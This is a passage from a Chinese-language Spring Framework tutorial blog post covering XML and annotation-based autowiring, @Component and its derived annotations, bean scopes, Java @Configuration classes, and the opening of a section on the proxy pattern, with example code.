http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;cat&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Cat&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dog222&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;</span><br><br>  <span class="hljs-comment">&lt;!--byName : 会自动在容器上下文中查找，和自己对象 set 方法后面的值对应的 beanid--&gt;</span><br>  <span class="hljs-comment">&lt;!--    &lt;bean id=&quot;people&quot; class=&quot;com.kuang.pojo.People&quot; autowire=&quot;byName&quot;&gt;--&gt;</span><br>  <span class="hljs-comment">&lt;!--byName : 会自动在容器上下文中查找，和自己对象属性类型相同的 bean--&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;people&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.People&quot;</span> <span class="hljs-attr">autowire</span>=<span class="hljs-string">&quot;byType&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;was&quot;</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--            &lt;property name=&quot;dog&quot; ref=&quot;dog&quot;/&gt;--&gt;</span><br>    <span class="hljs-comment">&lt;!--            &lt;property name=&quot;cat&quot; ref=&quot;cat&quot;/&gt;--&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311752708.png" alt="img"></p><p><strong>byType 只允许有一个对象属性</strong>，例如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dog222&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dog22&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>当有多个对象类型时，会直接报错</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311752316.png" alt="img"></p><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><ul><li><p>byName</p></li><li><ul><li><strong>需要保证所有bean的id唯一，并且这个bean需要和自动注入的属性的set方法的值一致</strong></li><li>当一个bean节点带有 <code>autowire byName</code>的属性时</li></ul></li></ul><ol><li><ol><li><ol><li>将查找其类中所有的set方法名，例如setCat，获得将set去掉并且首字母小写的字符串，即cat</li><li>去spring容器中寻找是否有此字符串名称id的对象</li><li>如果有，就取出注入；如果没有，就报空指针异常</li></ol></li></ol></li></ol><ul><li><p>byType</p></li><li><ul><li><strong>需要保证所有bean的class唯一，并且这个bean需要和自动注入的属性的类型一致</strong></li><li>如果不一致，会报异常：<code>NoUniqueBeanDefinitionException</code></li></ul></li></ul><h3 id="2-8-3-使用注解实现自动装配"><a href="#2-8-3-使用注解实现自动装配" class="headerlink" title="2.8.3 使用注解实现自动装配"></a>2.8.3 使用注解实现自动装配</h3><p>jdk 1.5支持注解，Spring 2.5 支持注解</p><p><strong>使用注解须知：</strong></p><ul><li>导入约束：context</li><li>配置注解的支持：context:annotation-config</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/context</span></span><br><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span>/&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="Autowired"><a href="#Autowired" class="headerlink" title="@Autowired"></a>@Autowired</h4><ul><li>属性上使用</li><li>set方式上使用</li><li>使用Autowired我们可以不用编写Set方法了，前提是你这个自动装配的属性在IOC（Spring）容器中存在，且符合名字</li></ul><p>@Autowired(required&#x3D;false)  说明：false，对象可以为null；true，对象必须存对象，不能为null。</p><p>&#x2F;&#x2F;如果允许对象为null，设置required &#x3D; false,默认为true</p><p>@Autowired(required &#x3D; false)</p><p>private Cat cat;</p><p>测试：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">  https://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="hljs-string"><span class="hljs-tag">  http://www.springframework.org/schema/context</span></span><br><span class="hljs-string"><span class="hljs-tag">  https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span>/&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;cat&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Cat&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dog&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;people&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.People&quot;</span>/&gt;</span><br>&lt;/beans<br>package com.kuang.pojo;<br><br>import org.springframework.beans.factory.annotation.Autowired;<br><br>public class People &#123;<br><br>    @Autowired<br>    private Cat cat;<br>    @Autowired<br>    private Dog dog;<br>    private String name;<br><br>    public Cat getCat() &#123;<br>        return cat;<br>    &#125;<br><br>    public void setCat(Cat cat) &#123;<br>        this.cat = cat;<br>    &#125;<br><br>    public String getName() &#123;<br>        return name;<br>    &#125;<br><br>    public void setName(String name) &#123;<br>        this.name = name;<br>    &#125;<br><br>    public Dog getDog() &#123;<br>        return dog;<br>    &#125;<br><br>    public void setDog(Dog dog) &#123;<br>        this.dog = dog;<br>    &#125;<br><br>    @Override<br>    public String toString() &#123;<br>        return &quot;People&#123;&quot; +<br>        &quot;cat=&quot; + cat +<br>        &quot;, dog=&quot; + dog +<br>        &quot;, name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +<br>        &#x27;&#125;&#x27;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749254.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749467.png" alt="不使用set方法"></p><h4 id="Qualifier"><a href="#Qualifier" class="headerlink" title="@Qualifier"></a>@Qualifier</h4><ul><li>当存在多个类型的Bean时，加入@Qualifier 可以根据byName的方式自动装配</li><li>@Qualifier不能单独使用</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749701.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749605.png" alt="img"></p><h4 id="Resource"><a href="#Resource" class="headerlink" title="@Resource"></a>@Resource</h4><ul><li>@Resource如有指定的name属性，先按该属性进行byName方式查找装配；</li><li>其次再进行默认的byName方式进行装配；</li><li>如果以上都不成功，则按byType的方式自动装配。</li><li>都不成功，则报异常。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311752141.png" alt="img"></p><h2 id="2-9-使用注解开发"><a href="#2-9-使用注解开发" class="headerlink" title="2.9 使用注解开发"></a>2.9 使用注解开发</h2><p>在spring4之后，想要使用注解形式，必须得要引入aop的包</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749649.png" alt="img"><br> <strong>使用注解须知：</strong></p><ul><li>导入约束：context</li><li>配置注解的支持：context:annotation-config</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/context</span></span><br><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span>/&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-9-1-Bean-实现"><a href="#2-9-1-Bean-实现" class="headerlink" title="2.9.1 Bean 实现"></a>2.9.1 Bean 实现</h3><p><strong>@Component</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">  https://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="hljs-string"><span class="hljs-tag">  http://www.springframework.org/schema/context</span></span><br><span class="hljs-string"><span class="hljs-tag">  https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span><br><br>  <span class="hljs-comment">&lt;!--指定要扫描的包，这个包下面的注解就会生效--&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.kuang.pojo&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span>/&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br>package com.kuang.pojo;<br><br>import org.springframework.stereotype.Component;<br><br>//等价于 <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.User&quot;</span>/&gt;</span><br>@Component<br>public class User &#123;<br>    public String name = &quot;qwer&quot;;<br>&#125;<br>import com.kuang.pojo.User;<br>import org.springframework.context.ApplicationContext;<br>import org.springframework.context.support.ClassPathXmlApplicationContext;<br><br>public class MyTest &#123;<br>    public static void main(String[] args) &#123;<br>        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;);<br>        User user = (User) context.getBean(&quot;user&quot;);<br><br>        System.out.println(user.name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749773.png" alt="img"></p><h3 id="2-9-2-属性注解"><a href="#2-9-2-属性注解" class="headerlink" title="2.9.2 属性注解"></a>2.9.2 属性注解</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Value(&quot;123&quot;)</span><br><span class="hljs-keyword">public</span> String name;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311753469.png" alt="img"></p><h3 id="2-9-3-衍生注解"><a href="#2-9-3-衍生注解" class="headerlink" title="2.9.3 衍生注解"></a>2.9.3 <strong>衍生注解</strong></h3><p><strong>@Component三个衍生注解</strong></p><p>为了更好的进行分层，Spring可以使用其它三个注解，功能一样，都是将某个类注册到Spring中，装配Bean</p><ul><li>@Controller：web层</li><li>@Service：service层</li><li>@Repository：dao层</li></ul><h3 id="2-9-4-自动装配注解"><a href="#2-9-4-自动装配注解" class="headerlink" title="2.9.4 自动装配注解"></a>2.9.4 自动装配注解</h3><p>@Autowired ：通过类型、名字自动装配</p><p>@Qualifier ：如果 @Autowired 不能唯一自动装配上属性，则通过 @Qualifier(value&#x3D;”xxx”)</p><p>@Resource ： 通过名字、类型自动装配</p><h3 id="2-9-5-作用域"><a href="#2-9-5-作用域" class="headerlink" title="2.9.5 作用域"></a>2.9.5 作用域</h3><p>@scope</p><ul><li>singleton：默认的，Spring会采用单例模式创建这个对象。关闭工厂 ，所有的对象都会销毁。</li><li>prototype：多例模式。关闭工厂 ，所有的对象不会销毁。内部的垃圾回收机制会回收</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//等价于 &lt;bean id=&quot;user&quot; class=&quot;com.kuang.pojo.User&quot;/&gt;</span><br><span class="hljs-meta">@Component</span><br><br><span class="hljs-meta">@Scope(&quot;singleton&quot;)</span><br><span class="hljs-comment">//@Scope(&quot;prototype&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br><br>    <span class="hljs-comment">// 相当于配置文件中 &lt;property name=&quot;name&quot; value=&quot;123&quot;/&gt;</span><br>    <span class="hljs-meta">@Value(&quot;123&quot;)</span><br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-comment">//public String name = &quot;qwer&quot;;</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-9-6-小结"><a href="#2-9-6-小结" class="headerlink" title="2.9.6 小结"></a>2.9.6 小结</h3><p><strong>XML与注解比较</strong></p><ul><li>XML可以适用任何场景 ，结构清晰，维护方便</li><li>注解不是自己提供的类使用不了，开发简单方便</li></ul><p><strong>xml与注解整合开发</strong> ：推荐最佳实践</p><ul><li>xml管理Bean</li><li>注解完成属性注入</li><li>使用过程中， 必须让注解生效，就需要开启注解的支持</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--指定要扫描的包，这个包下面的注解就会生效--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com.kuang&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span>/&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2-10-使用Java的方式进行配置"><a href="#2-10-使用Java的方式进行配置" class="headerlink" title="2.10 使用Java的方式进行配置"></a>2.10 使用Java的方式进行配置</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311753781.png" alt="img"></p><p><strong>JavaConfig 是 Spring 的一个子项目，在 Spring4 之后，他成了一个核心</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Value;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-comment">//@Component 说明这个类被 Spring 容器管理</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-comment">//属性注入值</span><br>    <span class="hljs-meta">@Value(&quot;123&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.config;<br><br><span class="hljs-keyword">import</span> com.kuang.pojo.User;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.ComponentScan;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Import;<br><br><span class="hljs-comment">//也会被 Spring 容器管理，因为它本来就是一个 @Component</span><br><span class="hljs-comment">//@Configuration 代表这个类是一个配置类，和 xml 配置文件作用一样</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@ComponentScan(&quot;com.kuang.pojo&quot;)</span><br><span class="hljs-comment">//导入合并其他配置类，类似于配置文件中的 inculde 标签</span><br><span class="hljs-meta">@Import(Config2.class)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Config</span> &#123;<br><br>    <span class="hljs-comment">//注册一个 Bean,相当于之前写的 bean 标签</span><br>    <span class="hljs-comment">//这个方法的名字，相当于 bean 标签的 id</span><br>    <span class="hljs-comment">//这个方法的返回值，相当于 bean 标签的 class</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">//new User() 相当于之前写的 &lt;bean class=&quot;com.kuang.pojo.User&quot;/&gt;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.config;<br><br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Config2</span> &#123;<br>&#125;<br><span class="hljs-keyword">import</span> com.kuang.config.Config;<br><span class="hljs-keyword">import</span> com.kuang.pojo.User;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.AnnotationConfigApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//如果完全使用了配置类方式去做，就只能通过 AnnotationConfigApplicationContext 来获取 Bean容器，通过配置类的 class 来获取</span><br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationConfigApplicationContext</span>(Config.class);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">getUser</span> <span class="hljs-operator">=</span> (User) context.getBean(<span class="hljs-string">&quot;getUser&quot;</span>);<br>        System.out.println(getUser.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="3、代理模式"><a href="#3、代理模式" class="headerlink" title="3、代理模式"></a>3、代理模式</h1><p><strong>代理模式即 SpringAOP 的底层</strong></p><p><strong>代理模式分为静态代理和动态代理</strong></p><p>原型：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749099.png" alt="img"> </p><h2 id="3-1-静态代理"><a href="#3-1-静态代理" class="headerlink" title="3.1 静态代理"></a>3.1 <strong>静态代理</strong></h2><p>角色分析：</p><ul><li>抽象角色 ： 一般会使用接口或者抽象类来解决</li><li>真实角色 ：被代理角色</li><li>代理角色 ：代理真实角色，</li><li>客户 ：访问代理对象的人</li></ul><p>代理模式的好处：</p><ul><li>可以使真实角色的操作更加纯粹，不用关注一些公共的业务</li><li>公共也交给代理角色，实现了业务的分工</li><li>公共业务发生扩展的时候，方便集中管理</li></ul><p>缺点：</p><ul><li>一个真实角色就会产生一个代理角色，代码量翻倍，开发效率会变低</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 